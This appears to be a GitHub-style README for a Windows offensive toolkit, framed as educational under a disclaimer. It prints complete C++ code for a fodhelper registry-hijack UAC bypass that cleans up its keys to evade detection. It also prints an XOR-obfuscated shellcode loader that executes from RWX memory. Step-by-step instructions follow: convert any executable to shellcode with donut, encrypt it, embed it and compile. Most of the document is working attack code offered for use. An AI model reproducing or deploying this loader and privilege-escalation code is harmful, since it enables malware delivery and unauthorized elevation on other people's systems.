# L3582-490DER

## Overview
This project contains two main components: a C++ UAC bypass demonstration and a Python shellcode encryption utility. **This is for educational purposes only** and was developed by 3582-490 to explore Windows API concepts and security mechanisms.

## DISCLAIMER
**I, 3582-490, created this code solely for educational and research purposes. I do not endorse, encourage, or take responsibility for any misuse of this code. Unauthorized use of these techniques against systems you don't own is illegal and unethical. Use this knowledge responsibly and only in environments where you have explicit permission.**

## Project Structure

### 1. L3582-490DER.cpp
This C++ code demonstrates various Windows API concepts including potential UAC bypass techniques (commented out for safety).

#### UAC Bypass Code Explanation:
```cpp
// UAC bypass technique using fodhelper (commented out for safety)

void mason__xa() {
    // Creates registry entries to hijack the fodhelper.exe UAC bypass
    HKEY mason__xb; // Registry key handle
    wchar_t mason__xc[MAX_PATH]; // Buffer for current executable path
    
    // Get the path of the current executable
    GetModuleFileNameW(NULL, mason__xc, MAX_PATH);
    
    // Create or open registry key for fodhelper hijack
    RegCreateKeyExW(HKEY_CURRENT_USER,
        L"Software\\Classes\\ms-settings\\shell\\open\\command",
        0, NULL, 0, KEY_WRITE, NULL, &mason__xb, NULL);
    
    // Set the default value to point to our executable
    RegSetValueExW(mason__xb, L"", 0, REG_SZ, (BYTE*)mason__xc, (wcslen(mason__xc) + 1) * sizeof(wchar_t));
    
    // Clear the DelegateExecute value to ensure our command runs
    RegSetValueExW(mason__xb, L"DelegateExecute", 0, REG_SZ, (BYTE*)L"", sizeof(wchar_t));
    
    // Launch fodhelper.exe which will execute our code with elevated privileges
    ShellExecuteW(NULL, L"open", L"fodhelper.exe", NULL, NULL, SW_HIDE);
    
    // Wait for execution to complete
    Sleep(3000);
    
    // Clean up registry entries to avoid detection
    RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
}

// Function to check if the current process has admin privileges
bool mason__xg() {
    BOOL mason__xh = FALSE; // Admin check result
    SID_IDENTIFIER_AUTHORITY mason__xi = SECURITY_NT_AUTHORITY; // NT authority
    PSID mason__xj; // Group SID

    // Create a SID for the Administrators group
    if (AllocateAndInitializeSid(&mason__xi, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &mason__xj)) {
        // Check if current token is member of Admin group
        CheckTokenMembership(NULL, mason__xj, &mason__xh);
        FreeSid(mason__xj); // Free the SID
    }
    return mason__xh; // Return admin status
}

```

#### Shellcode Execution Code Explanation:
```cpp
// Main function demonstrating XOR decryption and execution
int WINAPI WinMain(HINSTANCE mason__xk, HINSTANCE mason__xl, LPSTR mason__xm, int mason__xn) {
    // The commented section would check for admin privileges and attempt UAC bypass if not admin
    // if (!mason__xg()) {
    //    mason__xa();
    //    return 0;
    // }
    
    std::string mason__xd; // Unused string variable
    
    // Encrypted shellcode using XOR cipher (example values)
    unsigned char mason__xe[] = { 0x42, 0x6A, 0x75, 0xAA, 0xAA, 0x6A, 0x75, 0xAA };
    
    unsigned char mason__xf = 0xAA; // XOR decryption key
    
    // Decrypt the shellcode using XOR operation
    for (int mason__xi = 0; mason__xi < sizeof(mason__xe); ++mason__xi) {
        mason__xe[mason__xi] ^= mason__xf; // XOR each byte with key
    }
    
    // Allocate executable memory for the shellcode
    void* mason__xj = VirtualAlloc(0, sizeof(mason__xe), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    
    // Copy decrypted shellcode to executable memory
    memcpy(mason__xj, mason__xe, sizeof(mason__xe));
    
    // Execute the shellcode by casting memory to function pointer and calling it
    ((void(*)())mason__xj)();
    
    return 0;
}
```

### 2. ShellCodeXOR.py
This Python utility encrypts binary files (like shellcode) using XOR encryption for use in the C++ program.

#### Features:
- XOR encryption with customizable key (default 0xAA)
- Converts encrypted data to C-style array format
- Handles file input with validation
- Generates output ready for use in C++ programs

## How to Use

### Prerequisites
1. Download [donut](https://github.com/TheWover/donut/releases/download/v1.1/donut_v1.1.zip) to generate shellcode from executables
2. Python 3.x installed for the encryption script

### Step-by-Step Process

1. **Generate shellcode from an executable using donut:**
   ```
   donut.exe -i your_file.exe -o output.bin
   ```

2. **Encrypt the shellcode using the Python utility:**
   ```
   python ShellCodeXOR.py
   ```
   Follow the prompts to select your .bin file

3. **Replace the encrypted array in the C++ code:**
   - Copy the output from output.txt
   - Replace the `mason__xe` array in L3582-490DER.cpp with your encrypted shellcode

4. **Compile the C++ code:**
   - Use a C++ compiler like MinGW or Visual Studio
   - Ensure you link against the necessary libraries (Windows.h, etc.)

## Technical Details

### XOR Encryption
The project uses a simple XOR cipher with a single-byte key (0xAA) for demonstration purposes. In real-world scenarios, more robust encryption should be used.

### Memory Execution
The code uses `VirtualAlloc` with `PAGE_EXECUTE_READWRITE` permissions to allocate memory that can execute code. This technique is commonly monitored by security software.

### UAC Bypass (Commented Out)
The commented UAC bypass technique exploits the fodhelper.exe mechanism by creating specific registry entries. This technique is well-documented and likely detected by modern security solutions.

## Legal and Ethical Considerations

This code is provided for educational purposes only. Before using any of these techniques:

1. Ensure you have explicit written permission to test on the target system
2. Understand that these techniques may violate terms of service
3. Be aware that many of these methods are detected by modern security solutions
4. Never use this knowledge to harm others or disrupt systems

## About the Author

I'm 3582-490, a security enthusiast interested in understanding Windows internals and security mechanisms. I believe that understanding how systems can be exploited is essential to defending them effectively.

## License

This project is provided for educational purposes only. No license is granted for commercial use or redistribution.
